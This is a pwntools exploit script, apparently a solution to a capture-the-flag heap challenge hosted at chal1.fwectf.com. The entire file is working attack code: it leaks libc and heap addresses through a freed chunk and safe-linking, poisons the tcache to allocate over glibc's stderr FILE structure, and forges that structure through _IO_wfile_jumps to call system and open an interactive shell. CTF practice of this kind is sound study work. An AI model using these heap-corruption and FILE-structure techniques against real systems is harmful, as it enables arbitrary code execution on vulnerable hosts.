from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall.patch"
elf = ELF(vuln_path)
libc = elf.libc

# io = process([vuln_path]) if not f_remote else remote("192.168.5.44", 5000)
io = process([vuln_path]) if not f_remote else remote("chal1.fwectf.com", 8010)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def create(idx, size, data):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("Data: ", data)


def delete(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Index: ", str(idx))


def edit(idx, data):
    io.sendlineafter("> ", "3")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Data: ", data)


def show(idx):
    io.sendlineafter("> ", "4")
    io.sendlineafter("Index: ", str(idx))


p_chunk = 0x04040A0

create(0, 0x520, "aa")
create(1, 0x10, "a")
create(2, 0x200, "a")
create(3, 0x200, "a")
create(4, 0x200, "a")
delete(0)
show(0)
leak = u64(io.recv(8))
libc.address = leak - 0x203b20
log.success("libc :-----> " + hex(libc.address))
delete(2)
delete(3)
show(3)
leak = u64(io.recv(8))
log.success(hex(leak))
heap = (leak ^ leak >> 12) & 0xfffff000
log.success("heap :-----> " + hex(heap))

free_got = elf.got["free"]
target = free_got
stderr_adr = libc.symbols["_IO_2_1_stderr_"]
log.success("stderr :-----> " + hex(stderr_adr))

target = stderr_adr
edit(3, p64((heap + 0xa00) >> 12 ^ target))

create(5, 0x200, "/bin/sh")

system = libc.symbols["system"]
puts = libc.symbols["puts"]
free = libc.symbols["free"]

file = FileStructure(0)
file.flags = u64(p32(0xfbad0101) + b";sh\0")
file._IO_save_end = libc.sym["system"]
file._lock = stderr_adr - 0x10
file._wide_data = stderr_adr - 0x10
file._offset = 0
file._old_offset = 0
payload = b"\x00" * 24 + p32(1) + p32(0) + p64(0)
payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10)
payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)
file.unknown2 = payload

# create(10, 0xe8+4)
# delete(10)
log.success(len(bytes(file)))
ddebug("b *0x000040142f\n continue")
create(6, 0x200, bytes(file)[:0xe0])

io.sendline(b"5")
#io.sendlineafter("> ", "5")

io.interactive()
